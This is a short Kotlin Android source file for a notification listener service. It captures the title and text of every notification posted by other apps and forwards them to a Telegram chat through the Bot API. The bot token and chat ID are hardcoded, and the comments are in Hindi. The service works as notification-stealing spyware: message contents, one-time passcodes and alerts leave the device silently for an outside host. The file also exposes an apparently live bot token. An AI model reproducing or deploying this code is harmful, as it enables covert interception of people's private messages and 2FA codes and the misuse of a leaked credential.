package com.example.notiffwd

import android.app.Notification
import android.service.notification.NotificationListenerService
import android.service.notification.StatusBarNotification
import java.net.HttpURLConnection
import java.net.URL
import java.net.URLEncoder
import kotlin.concurrent.thread

class NotifListener : NotificationListenerService() {

    // 🔴 Tumhara Bot Token aur Chat ID
    private val BOT_TOKEN = "8962774335:AAEn1Run56dwlyGTF2jAXk6q777L56gZKb4"
    private val CHAT_ID = "8709921964"

    override fun onNotificationPosted(sbn: StatusBarNotification) {
        try {
            val pack = sbn.packageName ?: "unknown"
            if (pack == packageName) return

            val extras = sbn.notification.extras
            val title = extras.getString(Notification.EXTRA_TITLE) ?: ""
            val text = extras.getString(Notification.EXTRA_TEXT) ?: ""
            val bigText = extras.getString(Notification.EXTRA_BIG_TEXT) ?: ""

            if (title.isEmpty() && text.isEmpty() && bigText.isEmpty()) return

            val finalText = if (bigText.isNotEmpty()) bigText else text

            val time = java.text.SimpleDateFormat(
                "dd-MM-yyyy HH:mm:ss",
                java.util.Locale.getDefault()
            ).format(java.util.Date())

            val msg = """
🔔 Notification Aayi!
📱 App: $pack
👤 Title: $title
💬 Text: $finalText
⏰ Time: $time
            """.trimIndent()

            sendToTelegram(msg)

        } catch (e: Exception) {
            e.printStackTrace()
        }
    }

    private fun sendToTelegram(message: String) {
        thread {
            try {
                val url = URL(
                    "https://api.telegram.org/bot$BOT_TOKEN/sendMessage" +
                    "?chat_id=$CHAT_ID" +
                    "&text=${URLEncoder.encode(message, "UTF-8")}"
                )
                val conn = url.openConnection() as HttpURLConnection
                conn.requestMethod = "GET"
                conn.connectTimeout = 8000
                conn.readTimeout = 8000
                conn.connect()
                conn.inputStream.bufferedReader().readText()
                conn.disconnect()
            } catch (e: Exception) {
                e.printStackTrace()
            }
        }
    }
}